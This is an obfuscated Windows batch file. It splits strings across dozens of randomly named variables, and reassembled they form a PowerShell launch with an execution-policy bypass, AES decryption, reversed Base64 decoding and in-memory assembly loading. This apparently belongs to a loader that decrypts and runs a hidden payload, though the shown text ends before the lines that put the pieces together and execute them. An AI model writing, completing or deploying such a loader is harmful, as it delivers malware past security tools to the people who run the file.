@echo off
set "MSKjPOizkj=ws"
set "UJMVxACTeU=in"
set "EjheIAVnjv=ll"
set "RJjubnUrCj=.e"
set "hNIJAcSIAl=ll"
set "McvoByNNxj=\W"
set "REOMHIIHqb=em"
set "uuLDayvgjK=:\"
set "VUkhhlEHWZ=Po"
set "vIMMCROrlx= C"
set "CHWdooMxMA=Wi"
set "ghMKynsAxD=py"
set "MrcLziQedk=do"
set "gKsKTSrQtN=po"
set "SlrMbOLIyo=s\"
set "VqDtAefbrM=32"
set "HJKmxbYCfI=rS"
set "yuxDpRTcWC=st"
set "mefBOyCGDX=0\"
set "WSQbiKtjcc=rs"
set "CmXwauaJPt=we"
set "erFLDuZtNu=Sy"
set "oLOlxkcZsB=co"
set "ziNqeeQzxy=xe"
set "OzKRBljXJg=\v"
set "IkmxaCHSwj=we"
set "SLIRlZtYLM=y "
set "mbBoHzDcxi=1."
set "scIVZRhVDn=he"
set "UQxIbjkhBf= /"
set "JDtMZCIRvO=he"
set "TZurQGZbIF=nd"
set "vKNUgMwiJa=ow"
set "EzlNzbipIl=cd"
set "lJDRnTwVrS= %~dp0"
set "tKRCZzwklg=7Yiv"
set "ZnuPDMubui=tem."
set "GBBlJiMhuD=tryP"
set "mvsDnyPUAC=$kjs"
set "hKjQZFWkYF=eam("
set "xCeZzFChYX=$bXq"
set "FHNCIlnjlh=736u"
set "aPfexlvnsV=-4] "
set "uxxluAMlci=-Obj"
set "mHJFCVVOcJ=se()"
set "lDVydEbtCh=XqiY"
set "taEqNHUTNz=BC;$"
set "RkQJkRaRxF=grap"
set "ddVxVRapCy=morF"
set "sQlvsbMoVB=si);"
set "GhAjIkdRip=oL'["
set "PGMswTNeel=, (,"
set "VMIsuvFyjE=1..-"
set "cXvzBYQJpe=orF'"
set "qGXhFxuQFq=em.C"
set "nCwnHOKKcX=TllA"
set "udefxZoWtp=oin "
set "dXQypkOXdZ=.Cry"
set "WfOpHeyvoY=$xKh"
set "tqoSDsvQxT=Secu"
set "TgMWHwRLNY=;$rW"
set "pRxbPhNmbx=tion"
set "ECJAnWVYjO=('da"
set "PkxqWMzjik=i = "
set "ROCBzSgTFk=Ev.D"
set "FXMHIntkSA=16] "
set "qHVXnBBUJO=XqiY"
set "zDUlUZaGcm=VmHO"
set "AtHGalcshZ= New"
set "sSwwRwVRGL=vert"
set "vDrSLQBYwK=XqiY"
set "kdFWcsPukk='dqR"
set "hyDDoSQnkB=mory"
set "pEVLLjdDPD=ect "
set "YBAzbZLrTH=join"
set "nYsyzYekpi=Fo7l"
set "ThHuHLFfvm=0O+g"
set "KayZOaEjAK=Comp"
set "QnwLEGKOMj=pose"
set "LUBktCyheE=ing("
set "AJqDyRsWPO=pose"
set "eiylXYvfAg=hkO "
set "vuctBNQTdC=  $g"
set "FsqMVLlmAc=6esa"
set "njMIGPqkHL=GV ="
set "SQxybPgMjD= = $"
set "yJtgiaoMWt=;$mA"
set "YsDIRzDlgd=and "
set "IxOzbRPJKk=fore"
set "XrRWmmZJCi=ose("
set "JRodoGGqjS=le  "
set "HnzsjdyGbp=Conv"
set "OWlfqQknJa='gni"
set "rJJtXJZKoj=.Con"
set "RyiMBMvLNl=XqiY"
set "ZjgzeKyaNQ=ddin"
set "DhXNHqAMJf=..-1"
set "qeCXaatmJX=.Cry"
set "ixcdheADSO=rity"
set "CAYwpnGnhC=pher"
set "bNuDZIvikG=y]::"
set "zpRCslFgbU=comm"
set "hTqcMGghfL=raph"
set "oggCGjGOLJ=Mode"
set "mttdrMWfoW=yTo("
set "HcilLjdjvt=gMod"
set "ldbArBdguC='[-1"
set "tzOOcqtLKK=kO ="
set "eilmQCQxmd=tem."
set "cCTLJlvUiV=th('"
set "mSyKoicVsS= = $"
set "cxaUpUEAow=bjec"
set "DpJVZvKZyX=esMa"
set "sgTDWItVkd=rt]:"
set "bmEyaMlPQh=y.Ci"
set "dGSrXrrsOj=]::C"
set "cWtsCTSJRA=rans"
set "HvTycvZuLE=::('"
set "EVRPWFPuxq=ptog"
set "ZIzQYXkLOe=-joi"
set "WnyYioBPOZ=ddin"
set "KcnfrqxcwT=Secu"
set "uoenIocKEt=yste"
set "IIdUjAWFqV=$kjs"
set "iSuhhQvuPw='')("
set "hcRVWnPMZB=.Dis"
set "MuAoWuUhvD=i, 0"
set "EgEfQBoWtN=I.Su"
set "yviNXWyNTu=e]::"
set "fgyFieEMan=urit"
set "QKrMhdONpA=ecry"
set "ZPflGwXqKb=.Ass"
set "xUPMRIqaXx=Khsi"
set "WDoLhfTshS=BZI "
set "hJvpLPLrMC=-ep "
set "QUElQDaukT=y.Cr"
set "uHIoufdmmL=gnir"
set "FZbgAySPhe=.Len"
set "TwyGTXXQKm=);$F"
set "UfCFzbmfZV=brea"
set "itBxzZZrpG=sPBZ"
set "NCynWGZFRj=rtS4"
set "azqNsdxhMD=v = "
set "mRKiwFdVbY=nage"
set "UugHNkNukX=S46e"
set "RRtOlkMhHI=UGTu"
set "hGbtJlgyjD=Fina"
set "AekJiQLXGS=[-1."
set "CTAXsRccsK=)) {"
set "TetTavwShK=);$b"
set "kSEtcCFMXN=:('g"
set "bnOzahLsNG=m(, "
set "zTjZNsPKXn=m.Re"
set "RMTDnrONNh=ct S"
set "TWBAoKAOLK=O) {"
set "qiphcTHHaB=v4Ir"
set "pKFNNrVOyX=Star"
set "lIhFYQglAm=F'[-"
set "ZWUMRswQew=jsGV"
set "KZRgEtJQLS=pDZz"
set "CjWFctOGzJ=d;$b"
set "YXxitMfXJs=iron"
set "gnCLAbrXWo=.Mem"
set "ZkGvsvQkTb=);$m"
set "gqhVqHimKl=::De"
